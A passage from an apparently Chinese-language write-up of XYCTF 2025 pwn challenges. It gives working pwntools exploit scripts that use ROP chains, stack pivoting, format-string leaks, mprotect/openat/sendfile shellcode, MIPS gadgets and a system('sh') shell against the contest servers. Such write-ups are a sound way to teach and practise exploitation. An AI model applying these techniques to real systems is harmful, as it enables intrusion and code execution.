class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line"></span><br><span class="line">glibc = ctypes.CDLL(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./nailong&quot;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;47.94.217.82&quot;</span>,<span class="number">36901</span>)</span><br><span class="line">v0 = glibc.time(<span class="number">0</span>)-<span class="number">2</span>     <span class="comment">#remote -3</span></span><br><span class="line">glibc.srand(v0)</span><br><span class="line">elf = ELF(<span class="string">&quot;./nailong&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;rbp + offset:&quot;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;end&quot;</span>)[:-<span class="number">3</span>])</span><br><span class="line">log.success(<span class="string">&quot;stack: &quot;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">rbp = stack - (glibc.rand() % <span class="number">0x1B0</span> + <span class="number">0x50</span>)</span><br><span class="line">log.success(<span class="string">&quot;rbp: &quot;</span>+<span class="built_in">hex</span>(rbp))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;xiao_peng_you_ni_zhi_dao_wo_yao_qu_ji_lou_ma&quot;</span>,<span class="string">&quot;-1&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readfunc</span>(<span class="params">addr</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;chose&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;what you want do?&quot;</span>,<span class="built_in">str</span>(addr))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writefunc</span>(<span class="params">addr,data</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;chose&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;what you want do?&quot;</span>,<span class="built_in">str</span>(addr))</span><br><span class="line">    p.sendafter(<span class="string">&quot;read you want&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writep64</span>(<span class="params">addr,data</span>):</span><br><span class="line">    writefunc(addr,data[:<span class="number">4</span>])</span><br><span class="line">    writefunc(addr+<span class="number">4</span>,data[<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># read(0x404030)  </span></span><br><span class="line">readfunc(rbp+<span class="number">8</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x29d90</span></span><br><span class="line">ret = libc_base + <span class="number">0x0000000000029139</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x0000000000401650</span></span><br><span class="line"><span class="built_in">open</span> = libc_base + libc.sym[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">read = libc_base + libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write = libc_base + libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line">syscall = libc_base + <span class="number">0x0000000000042759</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">writefunc(rbp-<span class="number">0x8044</span>,<span class="string">b&quot;\xff\xff\xff\xce&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">writep64(<span class="number">0x404500</span>,p64(<span class="number">0x67616c662f</span>))</span><br><span class="line">writep64(rbp+<span class="number">8</span>,p64(pop_rdi_ret))</span><br><span class="line">writep64(rbp+<span class="number">0x10</span>,p64(<span class="number">0x404500</span>))</span><br><span class="line">writep64(rbp+<span class="number">0x18</span>,p64(pop_rsi_ret))</span><br><span class="line">writep64(rbp+<span class="number">0x20</span>,p64(<span class="number">0</span>))</span><br><span class="line">writep64(rbp+<span class="number">0x28</span>,p64(pop_rdx_ret))</span><br><span class="line">writep64(rbp+<span class="number">0x30</span>,p64(<span class="number">0</span>))</span><br><span class="line">writep64(rbp+<span class="number">0x38</span>,p64(<span class="built_in">open</span>))</span><br><span class="line"></span><br><span class="line">writep64(rbp+<span class="number">0x40</span>,p64(pop_rdi_ret))</span><br><span class="line">writep64(rbp+<span class="number">0x48</span>,p64(<span class="number">3</span>))</span><br><span class="line">writep64(rbp+<span class="number">0x50</span>,p64(pop_rsi_ret))</span><br><span class="line">writep64(rbp+<span class="number">0x58</span>,p64(<span class="number">0x404500</span>))</span><br><span class="line">writep64(rbp+<span class="number">0x60</span>,p64(pop_rdx_ret))</span><br><span class="line">writep64(rbp+<span class="number">0x68</span>,p64(<span class="number">0x100</span>))</span><br><span class="line">writep64(rbp+<span class="number">0x70</span>,p64(read))</span><br><span class="line"></span><br><span class="line">writep64(rbp+<span class="number">0x78</span>,p64(pop_rdi_ret))</span><br><span class="line">writep64(rbp+<span class="number">0x80</span>,p64(<span class="number">1</span>))</span><br><span class="line">writep64(rbp+<span class="number">0x88</span>,p64(pop_rsi_ret))</span><br><span class="line">writep64(rbp+<span class="number">0x90</span>,p64(<span class="number">0x404500</span>))</span><br><span class="line">writep64(rbp+<span class="number">0x98</span>,p64(pop_rdx_ret))</span><br><span class="line">writep64(rbp+<span class="number">0xa0</span>,p64(<span class="number">0x100</span>))</span><br><span class="line">writep64(rbp+<span class="number">0xa8</span>,p64(write))</span><br><span class="line"></span><br><span class="line">writefunc(rbp-<span class="number">0x803C</span>,p32(<span class="number">0</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406220809627.png"
                      class=""
                >
<p>XYCTF{0b6fb9b7-e291-4037-9833-52b7f99a0ec0}</p>
<h4 id="pwn-明日方舟寻访模拟器">pwn-明日方舟寻访模拟器</h4>
<p>前面各种抽卡逻辑没有漏洞，漏洞点主要在于后面分享功能存在栈溢出。但溢出的不多，只能放下3个rop元素。利用的挑战点是执行完一遍后会把标准输出关了。一开始是想着先控制rbp回来到read函数读取到可控地址处，然后再栈迁移回来。后面发现有更简单的方法。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406120325178.png"
                      class=""
                >
<p>由于程序本身存在<code>pop rdi;ret</code>的gadget，程序里又有<strong>system</strong>函数，PIE保护也没开启，所以我们可以想办法让一些全局变量变成我们想要的值然后赋给rdi，之后直接<strong>call
system</strong>即可。这里选用<strong>sum_count</strong>这个全局变量，因为每次抽卡都可以累加，而且程序也提供批量抽卡功能（上限10000），那么我们直接把<strong>sum_count</strong>累加成<strong>sh</strong>，然后就能获取shell了。最后获取shell后，还需要把标准输出重定向到标准错误，这样才好有回显。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406121530077.png"
                      class=""
                >
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line"><span class="comment"># libc = ctypes.CDLL(&quot;libc.so.6&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./arknights&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;47.94.217.82&quot;</span>,<span class="number">30781</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./arknights&quot;</span>)</span><br><span class="line"><span class="comment"># glibc = ELF(&quot;libc.so.6&quot;)</span></span><br><span class="line"><span class="comment"># /bin/sh:0x68732f6e69622f</span></span><br><span class="line"><span class="comment"># sh:0x6873-&gt;26739</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004018e5</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x0000000000401981</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000401393</span></span><br><span class="line">call_rax = <span class="number">0x0000000000401014</span></span><br><span class="line">system_plt = <span class="number">0x0000000000401130</span></span><br><span class="line">call_system = <span class="number">0x00000000004018FC</span></span><br><span class="line">start = <span class="number">0x0000000004011D0</span></span><br><span class="line">sum_count = <span class="number">0x405BCC</span></span><br><span class="line"></span><br><span class="line">p.sendline()</span><br><span class="line">p.sendlineafter(<span class="string">&quot;请选择&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;请输入寻访次数&quot;</span>,<span class="string">&quot;10000&quot;</span>)</span><br><span class="line">p.sendline()</span><br><span class="line">p.sendlineafter(<span class="string">&quot;请选择&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;请输入寻访次数&quot;</span>,<span class="string">&quot;10000&quot;</span>)</span><br><span class="line">p.sendline()</span><br><span class="line">p.sendlineafter(<span class="string">&quot;请选择&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;请输入寻访次数&quot;</span>,<span class="string">&quot;6739&quot;</span>)</span><br><span class="line">p.sendline()</span><br><span class="line">p.sendlineafter(<span class="string">&quot;请选择&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;请选择&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x48</span> + p64(pop_rdi_ret) + p64(sum_count) + p64(call_system)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;请输入你的名字&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406220953049.png"
                      class=""
                >
<p>XYCTF{6edda96d-aacb-434b-8a42-60f78e5d8e56}</p>
<h4 id="pwn-girlfriend">pwn-girlfriend</h4>
<p>内置菜单，其中方法3 <strong>reply</strong>
中能往name全局变量读取大量字节，但name全局变量实际只有0x30的大小，那我们就可以在这个区域内布局后续要用到的rop链。而且这个函数还有格式化字符串漏洞，可以一次性把所有要用的地址以及canary都泄露出来。通过动调可知，canary在偏移15，libc相关地址在偏移17，程序相关地址在偏移19。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406115158364.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406115248326.png"
                      class=""
                >
<p>然后方法一 <strong>girlfriend</strong>
中我们刚好可以栈溢出覆盖返回地址，那么显然就是栈迁移到我们可控的name全局变量下面的位置，然后由于这题开了沙箱，所以我选择先用
<strong>mprotect</strong>
改一段可执行，然后直接写<strong>openat</strong>+<strong>sendfile</strong>的shellcode。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406115350378.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406115803805.png"
                      class=""
                >
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reply</span>(<span class="params">name</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your Choice:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;name first&quot;</span>,name)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">girlfriend</span>(<span class="params">say</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your Choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;say to her?&quot;</span>,say)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buy</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your Choice:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;flowers?&quot;</span>,<span class="string">&quot;Y&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#-0x29d90</span></span><br><span class="line"><span class="comment"># p = process(&quot;./girlfriend&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;8.147.132.32&quot;</span>,<span class="number">20003</span>)</span><br><span class="line">payload = <span class="string">b&quot;%15$p.%17$p.%19$p&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span>,<span class="string">b&quot;A&quot;</span>) + p32(<span class="number">0x100</span>) + p32(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">reply(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;your name:\n&quot;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x29d90</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">base = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x1817</span></span><br><span class="line">log.success(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">log.success(<span class="string">&quot;base:&quot;</span>+<span class="built_in">hex</span>(base))</span><br><span class="line"></span><br><span class="line">ret = base + <span class="number">0x000000000000101a</span></span><br><span class="line">leave_ret = base + <span class="number">0x00000000000014f4</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdx_r12_ret = libc_base + <span class="number">0x000000000011f2e7</span></span><br><span class="line"><span class="comment"># fake_stack = base + 0x4500</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line">pop_rbx_jmp_rax = libc_base + <span class="number">0x000000000008d848</span></span><br><span class="line">syscall = libc_base + <span class="number">0x0000000000042759</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    xor rsi,rsi;</span></span><br><span class="line"><span class="string">    mov rbx,0x67616c662f;</span></span><br><span class="line"><span class="string">    push rbx;</span></span><br><span class="line"><span class="string">    mov rdx,0; </span></span><br><span class="line"><span class="string">    mov r10,0;</span></span><br><span class="line"><span class="string">    mov rdi,3;   </span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov eax,257; </span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rsi,3; </span></span><br><span class="line"><span class="string">    mov r10,50; </span></span><br><span class="line"><span class="string">    xor rdx,rdx;</span></span><br><span class="line"><span class="string">    mov rdi,rdx;</span></span><br><span class="line"><span class="string">    inc rdi;   </span></span><br><span class="line"><span class="string">    mov eax,40; </span></span><br><span class="line"><span class="string">    syscall;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x30</span> + p32(<span class="number">0x100</span>) + p32(<span class="number">0</span>)*<span class="number">3</span> + p64(pop_rdi_ret) + p64(base+<span class="number">0x4000</span>) + p64(pop_rsi_ret) + p64(<span class="number">0x1000</span>) + p64(pop_rdx_r12_ret) + p64(<span class="number">7</span>)*<span class="number">2</span> + p64(pop_rax_ret) + p64(<span class="number">0xa</span>) + p64(syscall)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(base+<span class="number">0x4110</span>) + p64(pop_rbx_jmp_rax) + p64(<span class="number">0</span>) + asm(shellcode)</span><br><span class="line">reply(payload)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x38</span> + p64(canary) + p64(base+<span class="number">0x40a0</span>-<span class="number">8</span>) + p64(leave_ret) <span class="comment">#+ p64(base+0x1623)</span></span><br><span class="line">girlfriend(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406221210064.png"
                      class=""
                >
<p>XYCTF{0a311a59-8dbe-43c8-bc43-eba20569d0ad}</p>
<h4 id="pwn-ez3.0">pwn-EZ3.0</h4>
<p>一道mips架构的pwn题，以前做过<a
href="https://collectcrop.github.io/blog/2024/09/21/mips-pwn/">类似的</a>栈溢出+retshellcode，这一题比较简单，主要就是考察对mips架构的基本掌握。用Ghidra打开进行分析（我的IDA分析不了mips
(ಥ﹏ಥ)），发现chall函数里面糊脸就是一个栈溢出。具体返回地址在哪个位置可以结合动态调试来看。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406113623083.png"
                      class=""
                >
<p>用如下方式进行调试，记得-L那指定好，不然会找不到<code>/lib/ld.so.1</code>。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">program = <span class="string">&quot;./EZ3.0&quot;</span></span><br><span class="line">p = process([<span class="string">&quot;qemu-mipsel&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/mipsel-linux-gnu&quot;</span>,<span class="string">&quot;-g&quot;</span>, <span class="string">&quot;6666&quot;</span>, program])</span><br><span class="line">gdb.attach(p,<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    file <span class="subst">&#123;program&#125;</span></span></span><br><span class="line"><span class="string">    target remote 127.0.0.1:6666</span></span><br><span class="line"><span class="string">    b main</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406114429666.png"
                      class=""
                >
<p>IDA搜字符串存在一个可以直接读取flag的命令。程序里也存在system函数的调用。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406114152173.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406114651337.png"
                      class=""
                >
<p>之后就是要找个可以控$a0的gadget，可以沿用ROPgadget。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406114501059.png"
                      class=""
                >
<p>这里第一个gadget就可以正确的控制$a0并返回到$sp+4位置处了，在$sp+4布局调用system函数的地址就可以读取到flag了。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x00400830</span></span><br><span class="line">system = <span class="number">0x004009EC</span></span><br><span class="line">gadget = <span class="number">0x00400a20</span>     <span class="comment"># lw $a0, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; nop</span></span><br><span class="line">command = <span class="number">0x0411010</span></span><br><span class="line">program = <span class="string">&quot;./EZ3.0&quot;</span></span><br><span class="line">p = process([<span class="string">&quot;qemu-mipsel&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/mipsel-linux-gnu&quot;</span>,<span class="string">&quot;-g&quot;</span>, <span class="string">&quot;6666&quot;</span>, program])</span><br><span class="line">gdb.attach(p,<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    file <span class="subst">&#123;program&#125;</span></span></span><br><span class="line"><span class="string">    target remote 127.0.0.1:6666</span></span><br><span class="line"><span class="string">    b main</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./EZ3.0&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&quot;8.147.132.32&quot;,41952)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x20</span> + p32(<span class="number">0</span>) + p32(gadget) + p32(<span class="number">0</span>) + p32(system) + p32(command)</span><br><span class="line">p.sendafter(<span class="string">&quot;&gt;&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406221634476.png"
                      class=""
                >
<p>XYCTF{5e624a31-34f2-47f5-9486-5b8420a39a29}</p>
<h4 id="pwn-heap2">pwn-heap2</h4>
<p>这里给出本地能打通的exp，当时比赛时远程一直打不通，估计是和堆布局有关，毕竟我本地的libc环境是<code>GLIBC 2.39-0ubuntu8.4</code>，而给出的libc是<code>(Ubuntu GLIBC 2.39-0ubuntu8.3)</code>，差了一个小版本。我怀疑<code>libseccomp.so.2</code>版本也有所不同，所以可能在堆上的布局也不同，毕竟我在计算一些chunk的地址时是看的本地的偏移。</p>
<p>题目本身是一个裸的UAF，不过只有16次机会add
chunk，而且分配了就收不回来。这里的我们其实可以靠UAF实现劫持tcachebin
chunk的fd域，然后分配chunk到**_IO_list_all<strong>，将其改成我们可控的chunk地址，然后就是打</strong>house_of_apple2**。</p>
<p>由于题目开了沙箱，所以最后要靠<strong>svcudp_reply+29</strong>和<strong>swapcontext</strong>的gadget实现<strong>rop</strong>。</p>
